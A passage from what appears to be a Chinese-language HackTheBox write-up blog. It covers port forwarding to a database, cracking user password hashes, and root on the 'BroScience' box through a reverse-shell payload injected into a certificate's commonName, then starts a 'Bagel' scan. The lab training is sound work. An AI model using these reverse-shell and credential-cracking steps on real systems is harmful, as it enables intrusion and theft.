<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -</span><br></pre></td></tr></table></figure>
<p>确认5432端口有服务在运行中</p>
<p>使用chisel进行端口转发</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./chisel_1.8.1_linux_amd64 server -p 9997 --reverse &amp;</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget 10.10.16.3/chisel_1.8.1_linux_amd64</span><br><span class="line">chmod +x chisel_1.8.1_linux_amd64</span><br><span class="line">./chisel_1.8.1_linux_amd64 client 10.10.16.3:9997 R:9996:127.0.0.1:5432</span><br></pre></td></tr></table></figure>
<p>在本机上连接postgresql</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psql -h 0.0.0.0 -p 9996 -U dbuser -d broscience -W</span><br><span class="line">RangeOfMotion%777</span><br></pre></td></tr></table></figure>
<p>查看数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\l</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                                                  List of databases</span><br><span class="line">    Name    |  Owner   | Encoding |   Collate   |    Ctype    | ICU Locale | Locale Provider |   Access privileges   </span><br><span class="line">------------+----------+----------+-------------+-------------+------------+-----------------+-----------------------</span><br><span class="line"> broscience | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | </span><br><span class="line"> postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | </span><br><span class="line"> template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | &#x3D;c&#x2F;postgres          +</span><br><span class="line">            |          |          |             |             |            |                 | postgres&#x3D;CTc&#x2F;postgres</span><br><span class="line"> template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | &#x3D;c&#x2F;postgres          +</span><br><span class="line">            |          |          |             |             |            |                 | postgres&#x3D;CTc&#x2F;postgres</span><br><span class="line">(4 rows)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查看数据库<code>broscience</code>中的表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\c broscience</span><br><span class="line">RangeOfMotion%777</span><br><span class="line">\dt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">           List of relations</span><br><span class="line"> Schema |   Name    | Type  |  Owner   </span><br><span class="line">--------+-----------+-------+----------</span><br><span class="line"> public | comments  | table | postgres</span><br><span class="line"> public | exercises | table | postgres</span><br><span class="line"> public | users     | table | postgres</span><br><span class="line">(3 rows)</span><br></pre></td></tr></table></figure>
<p>查看users表中数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          </span><br><span class="line">----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------</span><br><span class="line">  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05</span><br><span class="line">  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04</span><br><span class="line">  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04</span><br><span class="line">  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04</span><br><span class="line">  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04</span><br><span class="line">(5 rows)</span><br></pre></td></tr></table></figure>
<p>构造Hash如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">15657792073e8a843d4f91fc403454e1:NaCl</span><br><span class="line">13edad4932da9dbb57d9cd15b66ed104:NaCl</span><br><span class="line">bd3dad50e2d578ecba87d5fa15ca5f85:NaCl</span><br><span class="line">a7eed23a7be6fe0d765197b1027453fe:NaCl</span><br><span class="line">5d15340bded5b9395d5d14b9c21bc82b:NaCl</span><br></pre></td></tr></table></figure>
<p>爆破Hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 20 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<p>得到如下凭证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bill:iluvhorsesandgym</span><br><span class="line">dmytro:Aaronthehottest</span><br><span class="line">michael:2applesplus2apples</span><br></pre></td></tr></table></figure>
<p>尝试登入SSH服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh bill@10.10.11.195</span><br><span class="line">iluvhorsesandgym</span><br></pre></td></tr></table></figure>
<p>登入成功，查看user.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/bill/user.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8ca51558ef17c2ec059b606e71696280</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-28"><a class="markdownIt-Anchor" href="#权限提升-28"></a> 权限提升</h2>
<p>传递pspy</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget 10.10.*.*/pspy64</span><br><span class="line">chmod +x pspy64</span><br><span class="line">./pspy64</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023&#x2F;03&#x2F;23 12:54:01 CMD: UID&#x3D;0     PID&#x3D;14400  | &#x2F;bin&#x2F;bash -c &#x2F;opt&#x2F;renew_cert.sh &#x2F;home&#x2F;bill&#x2F;Certs&#x2F;broscience.crt</span><br></pre></td></tr></table></figure>
<p>查看<code>/opt/renew_cert.sh</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /opt/renew_cert.sh</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -ne 1 ] || [ <span class="variable">$1</span> == <span class="string">&quot;-h&quot;</span> ] || [ <span class="variable">$1</span> == <span class="string">&quot;--help&quot;</span> ] || [ <span class="variable">$1</span> == <span class="string">&quot;help&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> certificate.crt&quot;</span>;</span><br><span class="line">    <span class="built_in">exit</span> 0;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$1</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    openssl x509 -<span class="keyword">in</span> <span class="variable">$1</span> -noout -checkend 86400 &gt; /dev/null</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;No need to renew yet.&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span> 1;</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    subject=$(openssl x509 -<span class="keyword">in</span> <span class="variable">$1</span> -noout -subject | cut -d <span class="string">&quot;=&quot;</span> -f2-)</span><br><span class="line"></span><br><span class="line">    country=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;C = .&#123;2&#125;&#x27;</span>)</span><br><span class="line">    state=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;ST = .*,&#x27;</span>)</span><br><span class="line">    locality=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;L = .*,&#x27;</span>)</span><br><span class="line">    organization=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;O = .*,&#x27;</span>)</span><br><span class="line">    organizationUnit=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;OU = .*,&#x27;</span>)</span><br><span class="line">    commonName=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;CN = .*,?&#x27;</span>)</span><br><span class="line">    emailAddress=$(openssl x509 -<span class="keyword">in</span> <span class="variable">$1</span> -noout -email)</span><br><span class="line"></span><br><span class="line">    country=<span class="variable">$&#123;country:4&#125;</span></span><br><span class="line">    state=$(<span class="built_in">echo</span> <span class="variable">$&#123;state:5&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    locality=$(<span class="built_in">echo</span> <span class="variable">$&#123;locality:3&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    organization=$(<span class="built_in">echo</span> <span class="variable">$&#123;organization:4&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    organizationUnit=$(<span class="built_in">echo</span> <span class="variable">$&#123;organizationUnit:5&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    commonName=$(<span class="built_in">echo</span> <span class="variable">$&#123;commonName:5&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$subject</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Country     =&gt; <span class="variable">$country</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;State       =&gt; <span class="variable">$state</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Locality    =&gt; <span class="variable">$locality</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Org Name    =&gt; <span class="variable">$organization</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Org Unit    =&gt; <span class="variable">$organizationUnit</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Common Name =&gt; <span class="variable">$commonName</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Email       =&gt; <span class="variable">$emailAddress</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\nGenerating certificate...&quot;</span>;</span><br><span class="line">    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$country</span></span></span><br><span class="line"><span class="string">    <span class="variable">$state</span></span></span><br><span class="line"><span class="string">    <span class="variable">$locality</span></span></span><br><span class="line"><span class="string">    <span class="variable">$organization</span></span></span><br><span class="line"><span class="string">    <span class="variable">$organizationUnit</span></span></span><br><span class="line"><span class="string">    <span class="variable">$commonName</span></span></span><br><span class="line"><span class="string">    <span class="variable">$emailAddress</span></span></span><br><span class="line"><span class="string">    &quot;</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">    /bin/bash -c <span class="string">&quot;mv /tmp/temp.crt /home/bill/Certs/<span class="variable">$commonName</span>.crt&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;File doesn&#x27;t exist&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>This is a bash script that takes a path to a certificate file as its argument and checks if the certificate needs to be renewed. If it needs to be renewed, it generates a new certificate with the same subject and places it in a specific directory.<br />
Here’s a brief rundown of what the script does:</p>
<ol>
<li>The script checks if the correct number of arguments have been provided and prints a usage message if they haven’t.</li>
<li>It then checks if the certificate file exists, and if it doesn’t, it prints an error message and exits.</li>
<li>If the certificate file exists, the script checks if the certificate needs to be renewed by using the openssl command to check if the certificate is still valid for at least 24 hours (86400 seconds) using the -checkend option. If the certificate doesn’t need to be renewed, it prints a message and exits.</li>
<li>If the certificate needs to be renewed, the script extracts the subject fields from the certificate using the openssl command and assigns them to variables for later use.</li>
<li>The script then prints the subject fields to the console.</li>
<li>It then generates a new certificate using the openssl command with the req subcommand to generate a self-signed certificate. The certificate is generated with a validity period of 365 days, a key length of 4096 bits, and the same subject fields as the original certificate.</li>
<li>Finally, the script moves the newly generated certificate to a specific directory with the filename as the common name extracted from the subject of the original certificate, followed by the .crt extension.<br />
– Generated By ChatGPT</li>
</ol>
</blockquote>
<p>构造一个24小时后过期的证书</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/bfl.key -out /tmp/bfl.crt -days 1</span><br><span class="line">cp /tmp/bfl.crt /home/bill/Certs/broscience.crt</span><br></pre></td></tr></table></figure>
<p>其中在<code>commonName</code>字段填入如下Payload <code>$(bash -i &gt;&amp; /dev/tcp/10.10.*.*/9995 0&gt;&amp;1)</code></p>
<p>监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9995</span><br></pre></td></tr></table></figure>
<p>执行计划任务触发反弹Shell</p>
<p>查看root.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fc289e7710721538f1ae8054f35af549</span><br></pre></td></tr></table></figure>
<hr />
<p>一开始把5432端口的数据库当成Mysql了，弄半天连不上还以为是端口转发工具的问题，难绷</p>
<hr />
<h1 id="hackthebox_bagel"><a class="markdownIt-Anchor" href="#hackthebox_bagel"></a> HackTheBox_Bagel</h1>
<h2 id="信息收集-13"><a class="markdownIt-Anchor" href="#信息收集-13"></a> 信息收集</h2>
<h3 id="端口扫描-30"><a class="markdownIt-Anchor" href="#端口扫描-30"></a> 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.201</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.201</span><br><span class="line">Host is up (0.51s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)</span><br><span class="line">5000&#x2F;tcp open  upnp?</span><br><span class="line">8000&#x2F;tcp open  http-alt Werkzeug&#x2F;2.2.2 Python&#x2F;3.10.9</span><br><span class="line">2 services unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprints at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SF-Port5000-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;25%Time&#x3D;641E89C8%P&#x3D;x86_64-pc-linux-gnu%r(Ge</span><br><span class="line">SF:tRequest,73,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nServer:\x20Microsoft</span><br><span class="line">SF:-NetCore&#x2F;2\.0\r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2005:42:31\x20GMT\</span><br><span class="line">SF:r\nConnection:\x20close\r\n\r\n&quot;)%r(RTSPRequest,E8,&quot;HTTP&#x2F;1\.1\x20400\x2</span><br><span class="line">SF:0Bad\x20Request\r\nContent-Type:\x20text&#x2F;html\r\nServer:\x20Microsoft-N</span><br><span class="line">SF:etCore&#x2F;2\.0\r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2005:42:32\x20GMT\r\</span><br><span class="line">SF:nContent-Length:\x2054\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r</span><br><span class="line">SF:\n\r\n&lt;h1&gt;Bad\x20Request\x20\(Invalid\x20request\x20line\x20\(version\)</span><br><span class="line">SF:\.\)&lt;&#x2F;h1&gt;&quot;)%r(HTTPOptions,73,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nSer</span><br><span class="line">SF:ver:\x20Microsoft-NetCore&#x2F;2\.0\r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2</span><br><span class="line">SF:005:42:48\x20GMT\r\nConnection:\x20close\r\n\r\n&quot;)%r(Help,E6,&quot;HTTP&#x2F;1\.1</span><br><span class="line">SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text&#x2F;html\r\nServer:\x20M</span><br><span class="line">SF:icrosoft-NetCore&#x2F;2\.0\r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2005:43:00</span><br><span class="line">SF:\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\nKeep-Alive:</span><br><span class="line">SF:\x20true\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(Invalid\x20request\x20line\x20\</span><br><span class="line">SF:(parts\)\.\)&lt;&#x2F;h1&gt;&quot;)%r(SSLSessionReq,E6,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Requ</span><br><span class="line">SF:est\r\nContent-Type:\x20text&#x2F;html\r\nServer:\x20Microsoft-NetCore&#x2F;2\.0\</span><br><span class="line">SF:r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2005:43:00\x20GMT\r\nContent-Len</span><br><span class="line">SF:gth:\x2052\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n&lt;h1&gt;Ba</span><br><span class="line">SF:d\x20Request\x20\(Invalid\x20request\x20line\x20\(parts\)\.\)&lt;&#x2F;h1&gt;&quot;)%r(</span><br><span class="line">SF:TerminalServerCookie,E6,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nContent-</span><br><span class="line">SF:Type:\x20text&#x2F;html\r\nServer:\x20Microsoft-NetCore&#x2F;2\.0\r\nDate:\x20Sat</span><br><span class="line">SF:,\x2025\x20Mar\x202023\x2005:43:01\x20GMT\r\nContent-Length:\x2052\r\nC</span><br><span class="line">SF:onnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n&lt;h1&gt;Bad\x20Request\x2</span><br><span class="line">SF:0\(Invalid\x20request\x20line\x20\(parts\)\.\)&lt;&#x2F;h1&gt;&quot;)%r(TLSSessionReq,E</span><br><span class="line">SF:6,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text&#x2F;html\r\n</span><br><span class="line">SF:Server:\x20Microsoft-NetCore&#x2F;2\.0\r\nDate:\x20Sat,\x2025\x20Mar\x202023</span><br><span class="line">SF:\x2005:43:02\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\</span><br><span class="line">SF:nKeep-Alive:\x20true\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(Invalid\x20request\</span><br><span class="line">SF:x20line\x20\(parts\)\.\)&lt;&#x2F;h1&gt;&quot;);</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SF-Port8000-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;25%Time&#x3D;641E89C3%P&#x3D;x86_64-pc-linux-gnu%r(Ge</span><br><span class="line">SF:tRequest,1EA,&quot;HTTP&#x2F;1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug&#x2F;2\.2\.2\</span><br><span class="line">SF:x20Python&#x2F;3\.10\.9\r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2005:42:26\x2</span><br><span class="line">SF:0GMT\r\nContent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nContent-Length:</span><br><span class="line">SF:\x20263\r\nLocation:\x20http:&#x2F;&#x2F;bagel\.htb:8000&#x2F;\?page&#x3D;index\.html\r\nCo</span><br><span class="line">SF:nnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20lang&#x3D;en&gt;\n&lt;title</span><br><span class="line">SF:&gt;Redirecting\.\.\.&lt;&#x2F;title&gt;\n&lt;h1&gt;Redirecting\.\.\.&lt;&#x2F;h1&gt;\n&lt;p&gt;You\x20shoul</span><br><span class="line">SF:d\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20URL:\x</span><br><span class="line">SF:20&lt;a\x20href&#x3D;\&quot;http:&#x2F;&#x2F;bagel\.htb:8000&#x2F;\?page&#x3D;index\.html\&quot;&gt;http:&#x2F;&#x2F;bagel</span><br><span class="line">SF:\.htb:8000&#x2F;\?page&#x3D;index\.html&lt;&#x2F;a&gt;\.\x20If\x20not,\x20click\x20the\x20li</span><br><span class="line">SF:nk\.\n&quot;)%r(FourOhFourRequest,184,&quot;HTTP&#x2F;1\.1\x20404\x20NOT\x20FOUND\r\nS</span><br><span class="line">SF:erver:\x20Werkzeug&#x2F;2\.2\.2\x20Python&#x2F;3\.10\.9\r\nDate:\x20Sat,\x2025\x2</span><br><span class="line">SF:0Mar\x202023\x2005:42:32\x20GMT\r\nContent-Type:\x20text&#x2F;html;\x20chars</span><br><span class="line">SF:et&#x3D;utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close\r\n\r\n&lt;!doc</span><br><span class="line">SF:type\x20html&gt;\n&lt;html\x20lang&#x3D;en&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;&#x2F;title&gt;\n&lt;</span><br><span class="line">SF:h1&gt;Not\x20Found&lt;&#x2F;h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found</span><br><span class="line">SF:\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manu</span><br><span class="line">SF:ally\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.&lt;&#x2F;p</span><br><span class="line">SF:&gt;\n&quot;)%r(Socks5,213,&quot;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD\x20HTM</span><br><span class="line">SF:L\x204\.01&#x2F;&#x2F;EN\&quot;\n\x20\x20\x20\x20\x20\x20\x20\x20\&quot;http:&#x2F;&#x2F;www\.w3\.org</span><br><span class="line">SF:&#x2F;TR&#x2F;html4&#x2F;strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20&lt;meta\x20http-equiv&#x3D;\&quot;Content-Type\&quot;\x20content&#x3D;\&quot;te</span><br><span class="line">SF:xt&#x2F;html;charset&#x3D;utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Error\</span><br><span 